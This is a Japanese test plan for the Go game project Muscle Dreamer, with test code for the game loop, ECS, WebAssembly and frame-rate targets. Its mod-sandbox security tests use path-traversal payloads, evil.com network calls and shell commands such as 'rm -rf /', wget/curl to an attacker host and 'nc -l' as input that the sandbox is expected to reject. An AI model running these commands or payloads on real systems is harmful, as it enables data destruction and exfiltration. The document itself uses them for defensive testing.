# Muscle Dreamer 高度なテストケース一覧（拡張版）

## テストケース概要

| ID | テスト名 | カテゴリ | 複雑度 | 優先度 | 実装状況 | 推定工数 | 依存関係 |
|----|----------|----------|--------|--------|----------|----------|----------|
| **基本機能テスト** |
| TC-001 | ゲームインスタンス管理 | 単体 | 低 | 高 | ❌ | 2h | - |
| TC-002 | ゲームループ実行 | 単体 | 中 | 高 | ❌ | 3h | TC-001 |
| TC-003 | 描画システム検証 | 単体 | 中 | 高 | ❌ | 4h | TC-001 |
| TC-004 | YAML設定読み込み | 単体 | 中 | 高 | ❌ | 3h | - |
| **ECSアーキテクチャテスト** |
| TC-005 | EntityManager機能 | 統合 | 高 | 高 | ❌ | 6h | ECS実装 |
| TC-006 | SystemManager機能 | 統合 | 高 | 高 | ❌ | 6h | TC-005 |
| TC-007 | ECSパフォーマンス | パフォーマンス | 高 | 中 | ❌ | 4h | TC-005,006 |
| **WebAssemblyテスト** |
| TC-008 | WebAssembly初期化 | 統合 | 高 | 中 | ❌ | 5h | WASM環境 |
| TC-009 | WebAssembly-JS通信 | 統合 | 高 | 中 | ❌ | 6h | TC-008 |
| TC-010 | WebAssemblyパフォーマンス | パフォーマンス | 高 | 中 | ❌ | 4h | TC-008 |
| **アセット・テーマテスト** |
| TC-011 | アセット管理 | 統合 | 中 | 高 | ❌ | 4h | - |
| TC-012 | テーマシステム | 統合 | 高 | 中 | ❌ | 5h | アセット実装 |
| TC-013 | アセットキャッシュ | パフォーマンス | 中 | 中 | ❌ | 3h | TC-011 |
| **セキュリティテスト** |
| TC-014 | MODサンドボックス | セキュリティ | 高 | 高 | ❌ | 8h | MOD実装 |
| TC-015 | 入力検証 | セキュリティ | 中 | 高 | ❌ | 4h | - |
| TC-016 | パストラバーサル対策 | セキュリティ | 中 | 高 | ❌ | 3h | - |
| **パフォーマンステスト** |
| TC-017 | 60FPS保証 | パフォーマンス | 高 | 高 | ❌ | 6h | - |
| TC-018 | メモリ使用量監視 | パフォーマンス | 中 | 中 | ❌ | 4h | - |
| TC-019 | 負荷ストレス | パフォーマンス | 高 | 中 | ❌ | 6h | ECS実装 |
| **E2E・統合テスト** |
| TC-020 | クロスプラットフォーム起動 | E2E | 中 | 高 | ❌ | 5h | - |
| TC-021 | WebAssembly統合 | E2E | 高 | 中 | ❌ | 6h | Web環境 |
| TC-022 | 長時間安定性 | 統合 | 高 | 低 | ❌ | 12h | 全機能 |

**合計**: 22テストケース、推定工数: 115時間

## 詳細テストケース仕様

### 基本機能テスト群

#### TC-001: ゲームインスタンス管理テスト

**目的**: `core.NewGame()`の正常動作と初期状態を検証  
**複雑度**: 低  
**実装ファイル**: `internal/core/game_test.go`

**テストケース**:
```go
func TestNewGame(t *testing.T) {
    tests := []struct {
        name string
        want func(*Game) bool
    }{
        {
            name: "インスタンス生成成功",
            want: func(g *Game) bool { return g != nil },
        },
        {
            name: "型アサーション成功", 
            want: func(g *Game) bool { 
                _, ok := interface{}(g).(*Game)
                return ok 
            },
        },
        {
            name: "初期状態確認",
            want: func(g *Game) bool {
                // 将来のフィールド検証
                return true
            },
        },
    }
    
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            game := core.NewGame()
            assert.True(t, tt.want(game))
        })
    }
}
```

**成功基準**:
- ゲームインスタンスが正常に作成される
- 型アサーションが成功する
- 初期状態が期待値と一致する

---

#### TC-002: ゲームループ実行テスト

**目的**: `Update()`メソッドの冪等性と安定性を検証  
**複雑度**: 中  
**依存関係**: TC-001

**テストシナリオ**:

1. **基本動作テスト**
```go
func TestGameUpdateBasic(t *testing.T) {
    game := core.NewGame()
    
    err := game.Update()
    assert.NoError(t, err)
}
```

2. **冪等性テスト**
```go
func TestGameUpdateIdempotency(t *testing.T) {
    game := core.NewGame()
    
    // 1000回連続実行
    for i := 0; i < 1000; i++ {
        err := game.Update()
        assert.NoError(t, err, "Update failed at iteration %d", i)
    }
}
```

3. **メモリリークテスト**
```go
func TestGameUpdateMemoryLeak(t *testing.T) {
    game := core.NewGame()
    
    var initialMem runtime.MemStats
    runtime.GC()
    runtime.ReadMemStats(&initialMem)
    
    for i := 0; i < 1000; i++ {
        game.Update()
    }
    
    var finalMem runtime.MemStats
    runtime.GC()
    runtime.ReadMemStats(&finalMem)
    
    memIncrease := finalMem.Alloc - initialMem.Alloc
    assert.Less(t, memIncrease, uint64(1024*1024)) // 1MB未満
}
```

**成功基準**:
- エラーなく実行される
- 1000回実行でメモリリークが発生しない
- 実行時間が安定している

---

#### TC-003: 描画システム検証テスト

**目的**: `Draw()`メソッドの描画処理を詳細検証  
**複雑度**: 中  
**依存関係**: TC-001

**テストケース**:

1. **背景色検証**
```go
func TestGameDrawBackground(t *testing.T) {
    game := core.NewGame()
    screen := ebiten.NewImage(1280, 720)
    
    game.Draw(screen)
    
    // 複数ポイントで背景色確認
    points := []struct{ x, y int }{
        {0, 0},     // 左上
        {639, 359}, // 中央
        {1279, 719}, // 右下
    }
    
    expected := color.RGBA{50, 50, 100, 255}
    
    for _, p := range points {
        pixel := screen.At(p.x, p.y).(color.RGBA)
        assert.Equal(t, expected, pixel, 
            "Background color mismatch at (%d,%d)", p.x, p.y)
    }
}
```

2. **デバッグテキスト確認**
```go
func TestGameDrawDebugText(t *testing.T) {
    game := core.NewGame()
    screen := ebiten.NewImage(1280, 720)
    
    game.Draw(screen)
    
    // デバッグテキスト領域の色変化確認
    // (実際のテキスト検証は複雑なので、色変化で代用)
    textRegion := image.Rect(0, 0, 200, 20)
    hasText := false
    
    for y := textRegion.Min.Y; y < textRegion.Max.Y; y++ {
        for x := textRegion.Min.X; x < textRegion.Max.X; x++ {
            pixel := screen.At(x, y).(color.RGBA)
            if pixel != (color.RGBA{50, 50, 100, 255}) {
                hasText = true
                break
            }
        }
        if hasText {
            break
        }
    }
    
    assert.True(t, hasText, "Debug text not rendered")
}
```

3. **描画パフォーマンス**
```go
func BenchmarkGameDraw(b *testing.B) {
    game := core.NewGame()
    screen := ebiten.NewImage(1280, 720)
    
    b.ResetTimer()
    b.ReportAllocs()
    
    for i := 0; i < b.N; i++ {
        game.Draw(screen)
    }
}
```

**成功基準**:
- 背景色が正しく設定される
- デバッグテキストが描画される
- 描画処理が16ms未満で完了する

---

### ECSアーキテクチャテスト群

#### TC-005: EntityManager機能テスト

**目的**: ECSのエンティティ管理機能を包括的に検証  
**複雑度**: 高  
**依存関係**: ECS実装完了

**テストスイート**:

1. **エンティティライフサイクル**
```go
func TestEntityLifecycle(t *testing.T) {
    em := NewEntityManager()
    
    // 作成
    entity := em.CreateEntity()
    assert.NotEqual(t, EntityID(0), entity)
    assert.True(t, em.EntityExists(entity))
    
    // コンポーネント操作
    transform := &TransformComponent{X: 100, Y: 200}
    em.AddComponent(entity, transform)
    
    assert.True(t, em.HasComponent(entity, ComponentTransform))
    
    retrieved := em.GetComponent(entity, ComponentTransform)
    assert.Equal(t, transform, retrieved)
    
    // 削除
    em.RemoveComponent(entity, ComponentTransform)
    assert.False(t, em.HasComponent(entity, ComponentTransform))
    
    em.DestroyEntity(entity)
    assert.False(t, em.EntityExists(entity))
}
```

2. **大量エンティティ管理**
```go
func TestMassEntityManagement(t *testing.T) {
    em := NewEntityManager()
    
    const entityCount = 10000
    entities := make([]EntityID, entityCount)
    
    // 大量作成
    start := time.Now()
    for i := 0; i < entityCount; i++ {
        entities[i] = em.CreateEntity()
        em.AddComponent(entities[i], &TransformComponent{
            X: float64(i), Y: float64(i),
        })
    }
    createTime := time.Since(start)
    
    // クエリ性能
    start = time.Now()
    result := em.GetEntitiesWith(ComponentTransform)
    queryTime := time.Since(start)
    
    assert.Equal(t, entityCount, len(result))
    assert.Less(t, createTime, 100*time.Millisecond)
    assert.Less(t, queryTime, 10*time.Millisecond)
    
    // 大量削除
    start = time.Now()
    for _, entity := range entities {
        em.DestroyEntity(entity)
    }
    destroyTime := time.Since(start)
    
    assert.Less(t, destroyTime, 50*time.Millisecond)
    assert.Equal(t, 0, len(em.GetEntitiesWith(ComponentTransform)))
}
```

3. **エンティティクエリテスト**
```go
func TestEntityQueries(t *testing.T) {
    em := NewEntityManager()
    
    // 異なるコンポーネント組み合わせのエンティティ作成
    entity1 := em.CreateEntity()
    em.AddComponent(entity1, &TransformComponent{})
    
    entity2 := em.CreateEntity()
    em.AddComponent(entity2, &TransformComponent{})
    em.AddComponent(entity2, &SpriteComponent{})
    
    entity3 := em.CreateEntity()
    em.AddComponent(entity3, &SpriteComponent{})
    
    // クエリテスト
    transformEntities := em.GetEntitiesWith(ComponentTransform)
    spriteEntities := em.GetEntitiesWith(ComponentSprite)
    
    assert.Contains(t, transformEntities, entity1)
    assert.Contains(t, transformEntities, entity2)
    assert.NotContains(t, transformEntities, entity3)
    
    assert.NotContains(t, spriteEntities, entity1)
    assert.Contains(t, spriteEntities, entity2)
    assert.Contains(t, spriteEntities, entity3)
}
```

**成功基準**:
- 10,000エンティティを100ms以内で作成
- クエリが10ms以内で完了
- メモリリークが発生しない

---

#### TC-006: SystemManager機能テスト

**目的**: システム管理と実行順序を検証  
**複雑度**: 高  
**依存関係**: TC-005

**テストケース**:

1. **システム登録・実行**
```go
func TestSystemRegistrationAndExecution(t *testing.T) {
    sm := NewSystemManager()
    em := NewEntityManager()
    
    // モックシステム作成
    inputSystem := &MockInputSystem{}
    physicsSystem := &MockPhysicsSystem{}
    renderSystem := &MockRenderSystem{}
    
    // 登録（優先度順）
    sm.RegisterSystem(inputSystem)
    sm.RegisterSystem(physicsSystem) 
    sm.RegisterSystem(renderSystem)
    
    // 実行
    err := sm.UpdateSystems(0.016, em)
    assert.NoError(t, err)
    
    // 実行確認
    assert.True(t, inputSystem.WasExecuted)
    assert.True(t, physicsSystem.WasExecuted)
    assert.True(t, renderSystem.WasExecuted)
}
```

2. **システム実行順序テスト**
```go
func TestSystemExecutionOrder(t *testing.T) {
    sm := NewSystemManager()
    em := NewEntityManager()
    
    var executionOrder []string
    
    systems := []System{
        &OrderTestSystem{Name: "Input", Order: &executionOrder, Priority: 1},
        &OrderTestSystem{Name: "Physics", Order: &executionOrder, Priority: 2},
        &OrderTestSystem{Name: "Rendering", Order: &executionOrder, Priority: 3},
    }
    
    // 逆順で登録（優先度でソートされることを確認）
    for i := len(systems) - 1; i >= 0; i-- {
        sm.RegisterSystem(systems[i])
    }
    
    sm.UpdateSystems(0.016, em)
    
    expected := []string{"Input", "Physics", "Rendering"}
    assert.Equal(t, expected, executionOrder)
}
```

3. **システムエラーハンドリング**
```go
func TestSystemErrorHandling(t *testing.T) {
    sm := NewSystemManager()
    em := NewEntityManager()
    
    // エラーを発生させるシステム
    errorSystem := &ErrorTestSystem{
        ShouldError: true,
        ErrorMessage: "Test error",
    }
    
    normalSystem := &MockSystem{}
    
    sm.RegisterSystem(errorSystem)
    sm.RegisterSystem(normalSystem)
    
    err := sm.UpdateSystems(0.016, em)
    
    // エラーが適切に伝播される
    assert.Error(t, err)
    assert.Contains(t, err.Error(), "Test error")
    
    // 正常なシステムは実行されない（早期終了）
    assert.False(t, normalSystem.WasExecuted)
}
```

**成功基準**:
- システムが正しい順序で実行される
- エラーが適切にハンドリングされる
- 1000システム実行が10ms以内で完了

---

### WebAssemblyテスト群

#### TC-008: WebAssembly初期化テスト

**目的**: WebAssembly環境での初期化を検証  
**複雑度**: 高  
**実行環境**: WebAssembly専用

**テストケース**:

1. **環境検出テスト**
```go
//go:build js && wasm

func TestWebAssemblyEnvironmentDetection(t *testing.T) {
    // runtime.GOOS == "js" の確認
    assert.Equal(t, "js", runtime.GOOS)
    assert.Equal(t, "wasm", runtime.GOARCH)
    
    // WebAssembly特有の機能確認
    bridge := NewWebAssemblyBridge()
    assert.NotNil(t, bridge)
    
    browserInfo := bridge.GetBrowserInfo()
    assert.NotEmpty(t, browserInfo.UserAgent)
    assert.True(t, browserInfo.Supports.WebAssembly)
}
```

2. **ブラウザ互換性テスト**
```go
func TestBrowserCompatibility(t *testing.T) {
    bridge := NewWebAssemblyBridge()
    browserInfo := bridge.GetBrowserInfo()
    
    // 必須機能サポート確認
    requirements := map[string]bool{
        "WebAssembly": browserInfo.Supports.WebAssembly,
        "Canvas":      true, // 実装依存
        "AudioContext": browserInfo.Supports.AudioContext,
    }
    
    for feature, supported := range requirements {
        assert.True(t, supported, "Feature not supported: %s", feature)
    }
    
    // 解像度確認
    assert.Greater(t, browserInfo.ScreenWidth, 0)
    assert.Greater(t, browserInfo.ScreenHeight, 0)
}
```

3. **WebAssemblyメモリ管理**
```go
func TestWebAssemblyMemoryManagement(t *testing.T) {
    var memStats runtime.MemStats
    runtime.ReadMemStats(&memStats)
    
    initialHeap := memStats.HeapAlloc
    
    // メモリ集約処理
    game := core.NewGame()
    for i := 0; i < 100; i++ {
        game.Update()
    }
    
    runtime.GC()
    runtime.ReadMemStats(&memStats)
    
    finalHeap := memStats.HeapAlloc
    heapIncrease := finalHeap - initialHeap
    
    // WebAssemblyでのメモリ増加 < 5MB
    assert.Less(t, heapIncrease, uint64(5*1024*1024))
}
```

**成功基準**:
- WebAssembly環境が正しく検出される
- ブラウザ必須機能がサポートされている
- メモリ使用量が制限内に収まる

---

### セキュリティテスト群

#### TC-014: MODサンドボックステスト

**目的**: MODシステムのセキュリティを検証  
**複雑度**: 高  
**依存関係**: MOD実装完了

**攻撃シナリオテスト**:

1. **ファイルシステム攻撃対策**
```go
func TestModFileSystemAttackPrevention(t *testing.T) {
    mod := &Mod{
        Name: "MaliciousMod",
        Permissions: ModPermissions{
            FileAccess: []string{"mods/testmod/"},
        },
    }
    
    sandbox := NewModSandbox(mod)
    
    attacks := []struct {
        name string
        path string
    }{
        {"Path traversal up", "../../../etc/passwd"},
        {"Path traversal down", "mods/testmod/../../../etc/passwd"},
        {"Absolute path", "/etc/passwd"},
        {"Windows path", "C:\\Windows\\System32\\config\\sam"},
        {"Null byte injection", "mods/testmod/\x00../../etc/passwd"},
        {"URL encoding", "mods/testmod/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
    }
    
    for _, attack := range attacks {
        t.Run(attack.name, func(t *testing.T) {
            err := sandbox.WriteFile(attack.path, []byte("malicious"))
            assert.ErrorIs(t, err, ErrAccessDenied, 
                "Attack succeeded: %s", attack.path)
        })
    }
}
```

2. **ネットワーク攻撃対策**
```go
func TestModNetworkAttackPrevention(t *testing.T) {
    mod := &Mod{
        Name: "NetworkMod",
        Permissions: ModPermissions{
            NetworkAccess: false,
        },
    }
    
    sandbox := NewModSandbox(mod)
    
    networkAttacks := []struct {
        name   string
        method func() error
    }{
        {"HTTP GET", func() error { return sandbox.HTTPGet("http://evil.com") }},
        {"HTTPS GET", func() error { return sandbox.HTTPGet("https://evil.com") }},
        {"TCP Connect", func() error { return sandbox.TCPConnect("evil.com:80") }},
        {"UDP Connect", func() error { return sandbox.UDPConnect("evil.com:53") }},
        {"DNS Lookup", func() error { return sandbox.DNSLookup("evil.com") }},
    }
    
    for _, attack := range networkAttacks {
        t.Run(attack.name, func(t *testing.T) {
            err := attack.method()
            assert.ErrorIs(t, err, ErrNetworkAccessDenied)
        })
    }
}
```

3. **システムコマンド実行対策**
```go
func TestModSystemCommandPrevention(t *testing.T) {
    mod := &Mod{
        Name: "SystemMod",
        Permissions: ModPermissions{
            SystemAccess: false,
        },
    }
    
    sandbox := NewModSandbox(mod)
    
    systemAttacks := [][]string{
        {"rm", "-rf", "/"},
        {"cat", "/etc/passwd"},
        {"wget", "http://evil.com/malware"},
        {"curl", "-X", "POST", "http://evil.com/data"},
        {"nc", "-l", "1234"},
        {"sh", "-c", "echo pwned"},
    }
    
    for _, cmd := range systemAttacks {
        t.Run(strings.Join(cmd, " "), func(t *testing.T) {
            err := sandbox.ExecuteCommand(cmd[0], cmd[1:]...)
            assert.ErrorIs(t, err, ErrSystemAccessDenied)
        })
    }
}
```

4. **MODコード静的解析**
```go
func TestModCodeStaticAnalysis(t *testing.T) {
    maliciousScripts := []struct {
        name   string
        script string
        threat string
    }{
        {
            "OS Exit", 
            "package main\nimport \"os\"\nfunc main() { os.Exit(1) }",
            "System termination",
        },
        {
            "File deletion",
            "package main\nimport \"os\"\nfunc main() { os.Remove(\"/important\") }",
            "File manipulation",
        },
        {
            "Network access",
            "package main\nimport \"net/http\"\nfunc main() { http.Get(\"http://evil.com\") }",
            "Unauthorized network access",
        },
        {
            "Environment access",
            "package main\nimport \"os\"\nfunc main() { os.Getenv(\"SECRET\") }",
            "Environment variable access",
        },
    }
    
    for _, test := range maliciousScripts {
        t.Run(test.name, func(t *testing.T) {
            mod := &Mod{
                Name:    "TestMod",
                Scripts: []string{test.script},
            }
            
            threats := AnalyzeModSecurity(mod)
            assert.NotEmpty(t, threats, "Threat not detected: %s", test.threat)
            
            found := false
            for _, threat := range threats {
                if strings.Contains(threat.Description, test.threat) {
                    found = true
                    break
                }
            }
            assert.True(t, found, "Specific threat not identified: %s", test.threat)
        })
    }
}
```

**成功基準**:
- 全てのファイルシステム攻撃が阻止される
- ネットワークアクセスが適切に制限される
- システムコマンド実行が防がれる
- 静的解析で脅威が検出される

---

### パフォーマンステスト群

#### TC-017: 60FPS保証テスト

**目的**: リアルタイム性能要件を検証  
**複雑度**: 高  
**重要度**: 最高

**パフォーマンステスト**:

1. **フレームレート安定性**
```go
func TestFrameRateStability(t *testing.T) {
    game := core.NewGame()
    
    const (
        targetFPS    = 60
        testDuration = 10 * time.Second
        frameBudget  = time.Second / targetFPS // 16.67ms
        tolerance    = 2 // 58FPS以上
    )
    
    var frameTimings []time.Duration
    start := time.Now()
    frameCount := 0
    
    for time.Since(start) < testDuration {
        frameStart := time.Now()
        
        err := game.Update()
        assert.NoError(t, err)
        
        frameTime := time.Since(frameStart)
        frameTimings = append(frameTimings, frameTime)
        frameCount++
        
        // フレーム制限シミュレーション
        if frameTime < frameBudget {
            time.Sleep(frameBudget - frameTime)
        }
    }
    
    actualFPS := float64(frameCount) / testDuration.Seconds()
    
    // フレームレート分析
    sort.Slice(frameTimings, func(i, j int) bool {
        return frameTimings[i] < frameTimings[j]
    })
    
    p50 := frameTimings[len(frameTimings)/2]
    p95 := frameTimings[len(frameTimings)*95/100]
    p99 := frameTimings[len(frameTimings)*99/100]
    
    // 要件検証
    assert.GreaterOrEqual(t, actualFPS, float64(targetFPS-tolerance))
    assert.Less(t, p95, 20*time.Millisecond) // 95%のフレームが20ms以内
    assert.Less(t, p99, 30*time.Millisecond) // 99%のフレームが30ms以内
    
    t.Logf("FPS: %.2f, P50: %v, P95: %v, P99: %v", 
        actualFPS, p50, p95, p99)
}
```

2. **CPU使用率監視**
```go
func TestCPUUsageMonitoring(t *testing.T) {
    game := core.NewGame()
    
    // CPU使用率測定（簡易版）
    cpuStart := time.Now()
    cpuUsageSamples := make([]float64, 0)
    
    const sampleInterval = 100 * time.Millisecond
    const testDuration = 5 * time.Second
    
    var wg sync.WaitGroup
    wg.Add(1)
    
    // CPU監視ゴルーチン
    go func() {
        defer wg.Done()
        ticker := time.NewTicker(sampleInterval)
        defer ticker.Stop()
        
        start := time.Now()
        for time.Since(start) < testDuration {
            <-ticker.C
            
            // 簡易CPU使用率計算
            runtime.GC()
            usage := measureCPUUsage() // 実装必要
            cpuUsageSamples = append(cpuUsageSamples, usage)
        }
    }()
    
    // ゲーム実行
    start := time.Now()
    for time.Since(start) < testDuration {
        game.Update()
        time.Sleep(16670 * time.Microsecond) // ~60FPS
    }
    
    wg.Wait()
    
    // CPU使用率分析
    if len(cpuUsageSamples) > 0 {
        avgCPU := average(cpuUsageSamples)
        maxCPU := max(cpuUsageSamples)
        
        // CPU使用率 < 50% (平均), < 80% (最大)
        assert.Less(t, avgCPU, 50.0)
        assert.Less(t, maxCPU, 80.0)
        
        t.Logf("CPU Usage - Avg: %.2f%%, Max: %.2f%%", avgCPU, maxCPU)
    }
}
```

3. **メモリ使用量プロファイリング**
```go
func TestMemoryUsageProfiling(t *testing.T) {
    game := core.NewGame()
    
    var memStats []runtime.MemStats
    
    // 初期メモリ状態
    var initial runtime.MemStats
    runtime.GC()
    runtime.ReadMemStats(&initial)
    memStats = append(memStats, initial)
    
    // 1分間実行、10秒ごとにメモリ測定
    const totalTime = 60 * time.Second
    const measureInterval = 10 * time.Second
    
    start := time.Now()
    lastMeasure := start
    
    for time.Since(start) < totalTime {
        game.Update()
        
        if time.Since(lastMeasure) >= measureInterval {
            var mem runtime.MemStats
            runtime.GC()
            runtime.ReadMemStats(&mem)
            memStats = append(memStats, mem)
            lastMeasure = time.Now()
        }
        
        time.Sleep(16670 * time.Microsecond)
    }
    
    // メモリ使用量分析
    baselineAlloc := memStats[0].Alloc
    maxIncrease := uint64(0)
    
    for _, stat := range memStats[1:] {
        increase := stat.Alloc - baselineAlloc
        if increase > maxIncrease {
            maxIncrease = increase
        }
    }
    
    // メモリ増加量 < 50MB
    assert.Less(t, maxIncrease, uint64(50*1024*1024))
    
    // GC頻度確認
    gcRuns := memStats[len(memStats)-1].NumGC - memStats[0].NumGC
    assert.Less(t, gcRuns, uint32(100)) // 1分間で100回未満
    
    t.Logf("Max memory increase: %d bytes, GC runs: %d", maxIncrease, gcRuns)
}
```

**成功基準**:
- 58FPS以上を維持
- 95%のフレームが20ms以内
- CPU使用率平均50%未満
- メモリ増加量50MB未満

---

## テスト実装ロードマップ

### Phase 1: 基本実装 (Week 1-2)
- **TC-001～004**: 基本機能テスト
- **TC-015～016**: 基本セキュリティテスト
- **TC-020**: ビルドテスト

### Phase 2: ECS実装 (Week 3-4)
- **TC-005～006**: ECSアーキテクチャテスト
- **TC-011～013**: アセット管理テスト
- **TC-017～018**: 基本パフォーマンステスト

### Phase 3: 高度機能 (Week 5-6)
- **TC-008～010**: WebAssemblyテスト
- **TC-014**: MODセキュリティテスト
- **TC-019**: 負荷テスト

### Phase 4: 統合・品質保証 (Week 7-8)
- **TC-021**: E2E統合テスト
- **TC-022**: 長時間安定性テスト
- **継続的監視システム構築**

## 実装優先度マトリクス

| テストケース | ビジネス価値 | 技術的重要度 | 実装コスト | 優先度スコア |
|-------------|-------------|-------------|------------|-------------|
| TC-001～004 | 高 | 高 | 低 | 9/10 |
| TC-017 | 高 | 高 | 中 | 8/10 |
| TC-015～016 | 高 | 中 | 低 | 7/10 |
| TC-005～006 | 中 | 高 | 高 | 6/10 |
| TC-014 | 高 | 高 | 高 | 6/10 |
| TC-008～010 | 中 | 中 | 高 | 4/10 |
| TC-022 | 低 | 中 | 高 | 3/10 |

この高度なテストケース一覧は、Muscle Dreamerプロジェクトの品質保証に必要な包括的なテスト戦略を提供し、段階的な実装アプローチを明確にしています。